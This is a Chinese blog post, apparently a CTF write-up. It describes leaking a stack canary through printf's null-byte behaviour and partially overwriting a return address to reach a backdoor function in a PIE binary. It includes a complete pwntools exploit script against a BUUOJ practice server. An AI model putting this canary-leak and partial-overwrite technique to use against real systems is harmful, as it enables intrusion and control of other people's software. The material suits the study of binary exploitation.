---
ingested: true
ingestedAt: 2026-05-21
---

标题: PWN 栈溢出 - Canary 泄露与返回地址部分覆盖
UP主: 2301_79485835
链接: https://blog.csdn.net/2301_79485835/article/details/161288642
内容:

首先 checksec 检查保护机制：

- 64位程序
- 开启了栈溢出保护、栈不可执行保护、pie 栈地址随机

![[PWN-栈溢出-Canary泄露与返回地址部分覆盖/01-checksec.png]]

然后在 IDA 进行反汇编分析，可以看到这里的函数名称里面就有其在程序中的地址偏移：

![[PWN-栈溢出-Canary泄露与返回地址部分覆盖/02-ida-functions.png]]

这是偏移为 960 的函数内部，变量 buf 的最后一位是 canary，可以看到读取了两次屏幕的输入，第一次可以用来泄露 canary，第二次可用来触发栈溢出：

![[PWN-栈溢出-Canary泄露与返回地址部分覆盖/03-buf-canary.png]]

这里补充一下 printf 函数的特性：

打印时**遇到 `\x00` 才会停止输出**，会一直打印内存中的数据直到碰到空字节，而 canary 的最低字节就是 `\x00`，离 buf 变量也是最近的，所以我们可以将 canary 的最低字节覆盖，这样就可以让 printf 把 canary 的值一并打印出来，然后由于 buf 数组中有 6 个元素，每个都是 8 字节，所有第一次只需要填充前 6 个元素+最后一个元素的第一个字节就行，总共是 41 个字节，即可泄露出 canary 的另外 7 个字节

然后下面还可以看到偏移为 a3e 的函数就是后门函数

![[PWN-栈溢出-Canary泄露与返回地址部分覆盖/04-backdoor.png]]

然后就说考虑如何拼凑出这个后门函数的完整地址了，一开始是想泄露基地址的，但是发现，无法进行第二次栈溢出，所有这里就想到了覆盖返回地址的最后二字节来拼凑出后门函数地址

下面是 exp 脚本：

```python
from pwn import *
from LibcSearcher import LibcSearcher
context(arch='amd64', os='linux', log_level='debug')
io = connect('node5.buuoj.cn',28341)
offset = 41
io.recvuntil(b'Input your Name:\n')
payload = b'A'*(offset - 1) + b'X'
io.send(payload)
io.recvuntil(b'AAX')
canary = io.recv(7)
print(canary)
canary = u64(canary.rjust(8,b'\x00'))
print(hex(canary))
io.recvuntil(b':')
payload = b'A'*40 + p64(canary) + b'a'*8 + p16(0x0a3e)
io.send(payload)
io.interactive()
```

这是运行结果：

![[PWN-栈溢出-Canary泄露与返回地址部分覆盖/05-result.png]]
